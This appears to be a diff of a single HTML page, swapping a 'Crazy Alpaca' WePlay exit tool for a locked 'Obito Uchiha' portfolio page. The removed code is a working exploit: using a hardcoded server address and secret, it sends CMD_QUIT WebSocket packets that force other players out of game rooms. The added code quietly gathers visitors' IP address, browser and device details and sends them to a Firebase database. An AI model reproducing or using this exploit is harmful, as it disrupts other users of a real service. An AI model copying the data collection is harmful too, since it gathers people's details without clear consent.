@@ -3,278 +3,184 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Crazy Alpaca - Obito</title>
+<title>𝕺𝖇𝖎𝖙𝖔 𝖀𝖈𝖍𝖎𝖍𝖆</title>
 <meta name="theme-color" content="#dc2626">
 <style>
-*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-body{font-family:'Courier New',monospace;background:#000;color:#00ff41;min-height:100vh;background-image:linear-gradient(rgba(0,255,65,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,65,.03) 1px,transparent 1px);background-size:20px 20px}
-.back-bar{padding:15px;background:#0a0a0a;border-bottom:1px solid #dc2626;position:sticky;top:0;z-index:100}
-.back-btn{display:inline-flex;align-items:center;gap:8px;padding:10px 20px;background:rgba(220,38,38,.15);border:1px solid #dc2626;border-radius:8px;color:#fca5a5;text-decoration:none;font-size:14px;font-weight:600;font-family:-apple-system,sans-serif}
-.back-btn:active{background:rgba(220,38,38,.3)}
-.profile{padding:30px 20px 10px;text-align:center}
-.avatar-wrap{position:relative;display:inline-block;margin-bottom:14px}
-.avatar{width:120px;height:120px;border-radius:50%;border:3px solid #00ff41;box-shadow:0 0 20px #00ff41;background:#001a00;display:flex;align-items:center;justify-content:center;font-size:50px}
-.name{font-size:28px;font-weight:800;letter-spacing:3px;margin-bottom:8px;text-shadow:0 0 10px #00ff41}
-.badge{display:inline-block;background:rgba(0,255,65,.05);border:1px solid #00ff41;padding:6px 14px;border-radius:4px;font-size:12px}
-.container{max-width:480px;margin:0 auto;padding:0 16px 40px}
-.card{background:rgba(0,10,0,.8);border:1px solid #00ff41;border-radius:4px;padding:18px;margin-bottom:14px;position:relative}
-.card::before{content:'';position:absolute;top:0;left:0;width:15px;height:15px;border-top:2px solid #00ff41;border-left:2px solid #00ff41}
-.card::after{content:'';position:absolute;bottom:0;right:0;width:15px;height:15px;border-bottom:2px solid #00ff41;border-right:2px solid #00ff41}
-.card-title{font-size:11px;text-transform:uppercase;letter-spacing:3px;font-weight:700;margin-bottom:12px}
-.card-title::before{content:'> '}
-textarea,input[type=text]{width:100%;background:#000;color:#00ff41;border:1px solid #00ff41;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:11px;outline:none}
-textarea{min-height:90px;resize:vertical}
-input[type=text]{padding:10px;font-size:12px;margin-top:8px}
-textarea::placeholder,input::placeholder{color:#004d14}
-button{width:100%;padding:15px;border:2px solid #00ff41;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:10px;font-family:monospace;letter-spacing:2px;background:rgba(0,20,0,.8);color:#00ff41;text-transform:uppercase;transition:all .2s}
-button:active{background:rgba(0,255,65,.15);box-shadow:0 0 25px #00ff41}
-.btn-quit{background:rgba(0,20,0,.8);border-color:#00ff41;color:#00ff41}
-.btn-danger{background:rgba(40,0,0,.8);border-color:#ff003c;color:#ff003c;font-size:16px;padding:18px}
-.btn-ghost{background:rgba(0,20,0,.6);border:1px solid #00ff41;font-size:11px;padding:10px}
-.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.info-item{background:rgba(0,10,0,.8);padding:10px;border-radius:4px;border:1px solid #00ff41}
-.info-label{font-size:9px;color:#008833;text-transform:uppercase;letter-spacing:2px;margin-bottom:4px}
-.info-value{font-size:12px;word-break:break-all}
-.status-bar{display:flex;align-items:center;gap:8px;padding:12px 16px;background:rgba(0,10,0,.8);border:1px solid #00ff41;border-radius:4px;margin-bottom:14px;font-size:13px}
-.dot{width:10px;height:10px;border-radius:50%;background:#ff003c}
-.dot.on{background:#00ff41}
-#log{background:#000;font-size:10.5px;padding:12px;border-radius:4px;height:200px;overflow-y:auto;border:1px solid #00ff41;line-height:1.6;white-space:pre-wrap;word-break:break-all}
-.ok{color:#00ff41}.err{color:#ff003c}.warn{color:#ffcc00}.info{color:#00ccff}
-.hidden{display:none}
-.uid-list{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
-.uid-badge{background:rgba(0,255,65,.05);border:1px solid #00ff41;padding:5px 10px;border-radius:4px;font-size:11px}
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+body { font-family: -apple-system, 'Segoe UI', sans-serif; background: #0a0a0a; color: #e5e5e5; line-height: 1.6; overflow-x: hidden; }
+.container { max-width: 900px; margin: 0 auto; padding: 0 24px; }
+.lock { position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; z-index: 9999; background: radial-gradient(ellipse at top, #1a0a1a 0%, #0a0a0a 60%); overflow-y: auto; }
+.lock h1 { font-size: 30px; margin-bottom: 10px; background: linear-gradient(135deg, #dc2626, #7c3aed); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: 3px; }
+.lock .sub { color: #666; font-size: 13px; letter-spacing: 3px; margin-bottom: 20px; }
+.lock .did-box { background: #141414; border: 2px solid #dc2626; border-radius: 12px; padding: 20px 24px; margin: 12px 0; max-width: 400px; width: 100%; position: relative; }
+.lock .did-label { font-size: 11px; color: #666; letter-spacing: 3px; margin-bottom: 8px; }
+.lock .did-value { font-size: 16px; font-family: monospace; color: #fca5a5; word-break: break-all; letter-spacing: 1px; padding-right: 40px; }
+.copy-btn { position: absolute; right: 12px; bottom: 20px; background: rgba(220, 38, 38, 0.2); border: 1px solid rgba(220, 38, 38, 0.4); color: #fca5a5; font-size: 18px; width: 36px; height: 36px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+.lock button.primary { padding: 14px 40px; border-radius: 8px; border: none; background: linear-gradient(135deg, #dc2626, #7c3aed); color: white; font-size: 15px; font-weight: 700; cursor: pointer; letter-spacing: 2px; margin-top: 16px; }
+.lock button.request { padding: 12px 30px; border-radius: 8px; border: 1px solid #444; background: transparent; color: #a5b4fc; font-size: 13px; font-weight: 600; cursor: pointer; letter-spacing: 1px; margin-top: 10px; }
+.lock .status { margin-top: 16px; font-size: 13px; color: #fbbf24; min-height: 24px; max-width: 400px; }
+.lock .status.err { color: #f87171; }
+.lock .status.ok { color: #4ade80; }
+.lock .icon { font-size: 60px; margin-bottom: 20px; }
+.copy-toast { position: fixed; top: 30px; left: 50%; transform: translateX(-50%); background: #14532d; color: #86efac; padding: 12px 24px; border-radius: 8px; font-size: 14px; font-weight: 600; opacity: 0; pointer-events: none; transition: opacity 0.3s; z-index: 99999; }
+.copy-toast.show { opacity: 1; }
+.hidden { display: none !important; }
+.hero { min-height: 100vh; display: flex; align-items: center; padding: 60px 0 40px; background: radial-gradient(ellipse at top, #1a0a1a 0%, #0a0a0a 60%); }
+.hero-inner { display: flex; flex-direction: column; align-items: center; gap: 32px; text-align: center; }
+.avatar { width: 180px; height: 180px; border-radius: 50%; overflow: hidden; flex-shrink: 0; box-shadow: 0 20px 60px rgba(220, 38, 38, 0.4); border: 4px solid #dc2626; background: linear-gradient(135deg, #dc2626, #7c3aed); display: flex; align-items: center; justify-content: center; font-size: 72px; font-weight: 800; color: white; }
+.avatar img { width: 100%; height: 100%; object-fit: cover; object-position: center 25%; display: block; }
+.hero-text { max-width: 600px; }
+.hero-text h1 { font-size: 44px; font-weight: 800; margin-bottom: 12px; background: linear-gradient(135deg, #fff, #dc2626); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; word-break: break-word; letter-spacing: 3px; line-height: 1.2; }
+.hero-text .tagline { font-size: 17px; color: #888; margin-bottom: 24px; }
+.hero-text .uid-box { display: inline-flex; align-items: center; gap: 12px; padding: 8px 14px 8px 18px; background: rgba(220, 38, 38, 0.15); border: 1px solid rgba(220, 38, 38, 0.4); border-radius: 100px; font-size: 14px; color: #fca5a5; font-family: monospace; margin-bottom: 24px; }
+.uid-copy-btn { background: rgba(220, 38, 38, 0.3); border: 1px solid rgba(220, 38, 38, 0.5); color: #fca5a5; font-size: 14px; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; padding: 0; }
+.hero-text .badges { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 28px; justify-content: center; }
+.badge { padding: 7px 16px; background: rgba(220, 38, 38, 0.15); border: 1px solid rgba(220, 38, 38, 0.4); border-radius: 100px; font-size: 13px; color: #fca5a5; }
+.cta { display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; }
+.btn { padding: 13px 28px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 15px; display: inline-block; border: none; cursor: pointer; }
+.btn-primary { background: linear-gradient(135deg, #dc2626, #7c3aed); color: white; }
+section { padding: 60px 0; min-height: 100px; }
+.section-title { font-size: 28px; font-weight: 800; margin-bottom: 30px; display: flex; align-items: center; gap: 12px; }
+.section-title::before { content: ''; width: 4px; height: 28px; background: linear-gradient(135deg, #dc2626, #7c3aed); border-radius: 2px; }
+footer { padding: 40px 0; text-align: center; color: #555; font-size: 14px; border-top: 1px solid #1a1a1a; }
+@media (max-width: 600px) {
+  .hero-text h1 { font-size: 30px; }
+  .avatar { width: 150px; height: 150px; }
+  .section-title { font-size: 22px; }
+}
 </style>
 </head>
 <body>
-
-<div class="back-bar">
-  <a href="index.html" class="back-btn">← Back to Home</a>
-</div>
-
-<div class="profile">
-  <div class="avatar-wrap"><div class="avatar">🦙</div></div>
-  <div class="name">CRAZY ALPACA</div>
-  <div class="badge">WePlay Exit Tool</div>
-</div>
-
-<div class="container">
-
-  <div class="status-bar">
-    <span class="dot" id="dot"></span>
-    <span id="statusText">DISCONNECTED</span>
+<div class="copy-toast" id="copyToast">✅ Copied!</div>
+<div class="lock" id="lockScreen">
+  <div class="icon">🔒</div>
+  <h1>𝕺𝖇𝖎𝖙𝖔 𝖀𝖈𝖍𝖎𝖍𝖆</h1>
+  <div class="sub">ACCESS REQUIRED</div>
+  <div class="did-box">
+    <div class="did-label">YOUR DEVICE ID</div>
+    <div class="did-value" id="deviceIdBox">Loading...</div>
+    <button class="copy-btn" onclick="copyDeviceId()">📋</button>
   </div>
-
-  <div class="card">
-    <div class="card-title">WebSocket Dump Paste</div>
-    <textarea id="dumpInput" placeholder=">>> Poora Crazy Alpaca dump yahan paste karo..."></textarea>
-    <button class="btn-ghost" onclick="clearDump()">🗑️ Clear Dump</button>
-    <button onclick="parseDump()">⚡ CONNECT</button>
-  </div>
-
-  <div class="card hidden" id="infoCard">
-    <div class="card-title">Detected</div>
-    <div class="info-grid">
-      <div class="info-item"><div class="info-label">RID</div><div class="info-value" id="infoRid">-</div></div>
-      <div class="info-item"><div class="info-label">My UID</div><div class="info-value">296377219</div></div>
-    </div>
-    <div class="info-item" style="margin-top:8px;">
-      <div class="info-label">Players (<span id="playerCount">0</span>)</div>
-      <div class="uid-list" id="infoUids"></div>
-    </div>
-    <div class="info-item" style="margin-top:8px;">
-      <div class="info-label">✏️ Manual UIDs</div>
-      <input type="text" id="manualUids" placeholder="UID1, UID2, UID3">
-      <button class="btn-ghost" onclick="useManualUids()">✅ Use Manual</button>
+  <p style="font-size: 12px; color: #888; max-width: 400px;">ID copy karo owner ko bhejo. Ya REQUEST dabao.</p>
+  <button class="primary" onclick="checkApproval()">✅ CHECK APPROVAL</button>
+  <button class="request" onclick="requestAccess()">📩 REQUEST ACCESS</button>
+  <div class="status" id="lockStatus">Waiting for approval...</div>
+</div>
+<div id="mainApp" class="hidden">
+  <div class="hero">
+    <div class="container">
+      <div class="hero-inner">
+        <div class="avatar" id="avatarBox">𝕺</div>
+        <div class="hero-text">
+          <h1>𝕺𝖇𝖎𝖙𝖔 𝖀𝖈𝖍𝖎𝖍𝖆</h1>
+          <p class="tagline">Gamer • App Developer • Digital Creator</p>
+          <div class="uid-box">
+            <span>UID: 384969427</span>
+            <button class="uid-copy-btn" onclick="copyUid()" title="Copy UID">📋</button>
+          </div>
+          <div class="badges">
+            <span class="badge">🎮 Gamer</span>
+            <span class="badge">💻 Developer</span>
+            <span class="badge">🎨 Creator</span>
+          </div>
+          <div class="cta">
+            <a href="weplay://" class="btn btn-primary">Contact Me on WePlay</a>
+          </div>
+        </div>
+      </div>
     </div>
   </div>
-
-  <div class="card hidden" id="exitCard">
-    <div class="card-title">Exit Controls</div>
-    <div id="exitButtons"></div>
-  </div>
-
-  <div class="card">
-    <div class="card-title">Live Log</div>
-    <div id="log">Ready...</div>
-    <button class="btn-ghost" onclick="clearLog()">🗑️ Clear Log</button>
-  </div>
-
+  <footer>© 2026 𝕺𝖇𝖎𝖙𝖔 𝖀𝖈𝖍𝖎𝖍𝖆</footer>
 </div>
-
 <script>
-const WS_URL = 'ws://35.154.196.40:14501/ws';
-const SECRET = "03070b6684fbac2147e855208badd7ac";
-const MY_UID = 296377219;
-const REGISTER_CMD = "CMD_HEART_BEAT";
-const EXIT_CMD = "CMD_QUIT";
-
-let parsed = { rid: null, uids: [] };
-let ws = null;
-let pid = 1;
-
-function log(msg, type) {
-  const el = document.getElementById('log');
-  const cls = type || '';
-  const t = new Date().toLocaleTimeString();
-  el.innerHTML += `<span class="${cls}">[${t}] ${msg}</span>\n`;
-  el.scrollTop = el.scrollHeight;
-}
-
-function setStatus(c) {
-  document.getElementById('dot').className = 'dot' + (c ? ' on' : '');
-  document.getElementById('statusText').textContent = c ? 'CONNECTED' : 'DISCONNECTED';
-}
-
-function clearDump() { document.getElementById('dumpInput').value = ''; log('Dump cleared ✅', 'info'); }
-function clearLog() { document.getElementById('log').innerHTML = ''; log('Log cleared ✅', 'info'); }
-
-document.getElementById('dumpInput').addEventListener('paste', function() {
-  setTimeout(() => parseDump(), 200);
-});
-
-function parseDump() {
-  const raw = document.getElementById('dumpInput').value.trim();
-  if (!raw) { log('Dump paste karo', 'err'); return; }
-  log('Parsing...', 'info');
-
-  const ridMatch = raw.match(/"rid"\s*:\s*(\d+)/);
-  if (ridMatch) parsed.rid = parseInt(ridMatch[1]);
-
-  const detectedUids = new Set();
-  const gamersMatch = raw.match(/"gamers"\s*:\s*\[(.*?)\]\s*,\s*"mode"/s);
-  if (gamersMatch) {
-    const uids = [...gamersMatch[1].matchAll(/"uid"\s*:\s*(\d+)/g)].map(m => parseInt(m[1]));
-    uids.forEach(u => { if (u !== MY_UID && u > 100000000) detectedUids.add(u); });
+const FIREBASE_URL = 'https://obito-app-default-rtdb.firebaseio.com';
+const WHITELIST_URL = 'https://api.github.com/repos/obito-uchiha-07/Portfolio/contents/whitelist.json';
+const MY_UID = '384969427';
+function getDeviceId() {
+  let id = localStorage.getItem('obito_device_id');
+  if (!id) {
+    const rand = Math.random().toString(36).substr(2, 6).toUpperCase();
+    const time = Date.now().toString(36).toUpperCase().slice(-4);
+    id = 'OB-' + rand + '-' + time;
+    localStorage.setItem('obito_device_id', id);
   }
-  [...raw.matchAll(/"remove_progress"\s*:\s*\{[^}]*"uid"\s*:\s*(\d+)/g)].forEach(m => {
-    const u = parseInt(m[1]);
-    if (u !== MY_UID && u > 100000000) detectedUids.add(u);
-  });
-
-  parsed.uids = [...detectedUids].slice(0, 6);
-
-  document.getElementById('infoRid').textContent = parsed.rid || '❌';
-  document.getElementById('playerCount').textContent = parsed.uids.length;
-  document.getElementById('infoUids').innerHTML = parsed.uids.map((u, i) => 
-    `<span class="uid-badge">${i+1}. ${u}</span>`).join('') || '<span style="color:#ffcc00;">⚠️ Koi UID nahi mili</span>';
-  document.getElementById('infoCard').classList.remove('hidden');
-
-  buildExitButtons();
-  log(`RID: ${parsed.rid}`, 'ok');
-  log(`Players: ${parsed.uids.join(', ') || 'kuch nahi'}`, 'ok');
-
-  if (parsed.rid && parsed.uids.length > 0) setTimeout(connect, 500);
+  return id;
 }
-
-function buildExitButtons() {
-  const container = document.getElementById('exitButtons');
-  const count = parsed.uids.length;
-  let html = '';
-  if (count === 0) {
-    html = `<div style="color:#ffcc00;padding:10px;text-align:center;">⚠️ Koi player nahi</div>`;
-  } else {
-    for (let i = 0; i < count; i++) {
-      html += `<button class="btn-quit" onclick="quitUid(${i})">▶ PLAYER ${i+1} EXIT (${parsed.uids[i]})</button>`;
-    }
-    html += `<button class="btn-danger" onclick="quitAll()">💀 SAB EXIT KARO</button>`;
+const DEVICE_ID = getDeviceId();
+document.getElementById('deviceIdBox').textContent = DEVICE_ID;
+function copyDeviceId() { copyText(DEVICE_ID, 'Device ID'); }
+function copyUid() { copyText(MY_UID, 'WePlay UID'); }
+function copyText(text, label) {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(() => showCopyToast(label + ' copied!')).catch(fallbackCopy);
+  } else { fallbackCopy(); }
+  function fallbackCopy() {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); showCopyToast(label + ' copied!'); } catch(e) { alert('Copy: ' + text); }
+    document.body.removeChild(ta);
   }
-  container.innerHTML = html;
-  document.getElementById('exitCard').classList.remove('hidden');
-  log(`✅ ${count} exit buttons`, 'ok');
 }
-
-function useManualUids() {
-  const input = document.getElementById('manualUids').value.trim();
-  if (!input) { log('Manual UIDs daalo', 'err'); return; }
-  const uids = input.split(',').map(s => parseInt(s.trim())).filter(n => !isNaN(n) && n !== MY_UID);
-  if (uids.length === 0) { log('Invalid', 'err'); return; }
-  parsed.uids = uids.slice(0, 6);
-  document.getElementById('playerCount').textContent = parsed.uids.length;
-  document.getElementById('infoUids').innerHTML = parsed.uids.map((u, i) => 
-    `<span class="uid-badge">${i+1}. ${u}</span>`).join('');
-  buildExitButtons();
-  log(`✅ Manual UIDs`, 'ok');
-  if (parsed.rid) connect();
+function showCopyToast(msg) {
+  const toast = document.getElementById('copyToast');
+  toast.textContent = '✅ ' + msg; toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), 2000);
 }
-
-function connect() {
-  if (ws && ws.readyState === 1) return;
-  ws = new WebSocket(WS_URL);
-  pid = 1;
-  ws.onopen = () => {
-    log('Connected!', 'ok');
-    setStatus(true);
-    ws.send(JSON.stringify({
-      packet_id: pid++,
-      command: REGISTER_CMD,
-      param: { secret: SECRET, accept_encoding: 0, rid: parsed.rid, uid: MY_UID }
-    }));
+async function checkApproval() {
+  const status = document.getElementById('lockStatus');
+  status.textContent = '⏳ Checking...'; status.className = 'status';
+  try {
+    const res = await fetch(WHITELIST_URL + '?t=' + Date.now(), { cache: 'no-store', headers: { 'Accept': 'application/vnd.github.v3+json' } });
+    if (!res.ok) throw new Error('API error');
+    const data = await res.json();
+    const decoded = JSON.parse(atob(data.content.replace(/\n/g, '')));
+    const approved = decoded.approved || [];
+    if (approved.includes(DEVICE_ID)) {
+      status.textContent = '✅ APPROVED! Opening...'; status.className = 'status ok';
+      setTimeout(() => {
+        document.getElementById('lockScreen').classList.add('hidden');
+        document.getElementById('mainApp').classList.remove('hidden');
+        loadAvatar();
+      }, 800);
+    } else { status.textContent = '❌ Not approved yet.'; status.className = 'status err'; }
+  } catch (e) { status.textContent = '⚠️ Error: ' + e.message; status.className = 'status err'; }
+}
+async function requestAccess() {
+  const status = document.getElementById('lockStatus');
+  status.textContent = '📩 Sending request...'; status.className = 'status';
+  let ip = 'unknown';
+  try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
+  const requestData = {
+    deviceId: DEVICE_ID, time: new Date().toLocaleString('en-IN'), timestamp: Date.now(),
+    platform: navigator.platform || 'unknown',
+    deviceInfo: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'unknown',
+    browser: navigator.userAgent, screen: window.screen.width + 'x' + window.screen.height,
+    language: navigator.language || 'unknown',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+    ip: ip, status: 'pending'
   };
-  ws.onmessage = (e) => {
-    try {
-      const j = JSON.parse(e.data);
-      if (j.code !== undefined) log(`[${j.packet_id}] code:${j.code}`, j.code === 200 ? 'ok' : 'err');
-      if (j.event === 12 && j.message?.remove_progress?.uid) {
-        log(`🎯 ${j.message.remove_progress.uid} EXIT!`, 'ok');
-      }
-    } catch (e) {}
-  };
-  ws.onerror = () => log('Error', 'err');
-  ws.onclose = () => { log('Closed', 'warn'); setStatus(false); };
+  try {
+    const key = DEVICE_ID.replace(/[^A-Z0-9-]/g, '');
+    const res = await fetch(FIREBASE_URL + '/requests/' + key + '.json', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(requestData) });
+    if (res.ok) { status.textContent = '✅ Request sent! Owner approve karega.'; status.className = 'status ok'; }
+    else { status.textContent = '❌ Failed. Try again.'; status.className = 'status err'; }
+  } catch (e) { status.textContent = '⚠️ Error: ' + e.message; status.className = 'status err'; }
 }
-
-function quitUid(i) {
-  if (i >= parsed.uids.length) { log(`Player ${i+1} nahi`, 'err'); return; }
-  log(`Quitting ${parsed.uids[i]}...`, 'info');
-  quitInNewConnection(parsed.uids[i]);
-}
-
-function quitAll() {
-  if (parsed.uids.length === 0) { log('Koi UID nahi', 'err'); return; }
-  log(`Exit all ${parsed.uids.length} players`, 'info');
-  parsed.uids.forEach((uid, i) => setTimeout(() => quitInNewConnection(uid), i * 2500));
-}
-
-function quitInNewConnection(targetUid) {
-  log(`→ New conn (${targetUid})`, 'info');
-  const tmpWs = new WebSocket(WS_URL);
-  let tmpPid = 1;
-  let registered = false;
-  
-  tmpWs.onopen = () => {
-    tmpWs.send(JSON.stringify({
-      packet_id: tmpPid++,
-      command: REGISTER_CMD,
-      param: { secret: SECRET, accept_encoding: 0, rid: parsed.rid, uid: MY_UID }
-    }));
-  };
-  
-  tmpWs.onmessage = (e) => {
-    try {
-      const j = JSON.parse(e.data);
-      if (j.code !== undefined) log(`   [${j.packet_id}] code:${j.code}`, j.code === 200 ? 'ok' : 'err');
-      if (j.packet_id === 1 && j.code === 200 && !registered) {
-        registered = true;
-        setTimeout(() => {
-          tmpWs.send(JSON.stringify({
-            packet_id: tmpPid++,
-            command: EXIT_CMD,
-            param: { rid: parsed.rid, uid: targetUid }
-          }));
-          log(`   📤 ${EXIT_CMD} -> ${targetUid}`, 'warn');
-        }, 500);
-        setTimeout(() => tmpWs.close(), 4000);
-      }
-      if (j.event === 12 && j.message?.remove_progress?.uid === targetUid) {
-        log(`   🎯 ${targetUid} EXIT HO GAYA!`, 'ok');
-      }
-    } catch (e) {}
-  };
-  
-  tmpWs.onerror = () => log(`   Error`, 'err');
-  tmpWs.onclose = () => log(`   🔒 Closed`, 'info');
+setTimeout(checkApproval, 1000);
+function loadAvatar() {
+  const box = document.getElementById('avatarBox');
+  const names = ['dp.jpg', 'dp.jpeg', 'dp.png'];
+  let i = 0;
+  function next() {
+    if (i >= names.length) return;
+    const img = new Image();
+    img.onload = () => { box.innerHTML = ''; box.appendChild(img); };
+    img.onerror = () => { i++; next(); };
+    img.src = names[i] + '?t=' + Date.now();
+  }
+  next();
 }
 </script>
-
 </body>
 </html>
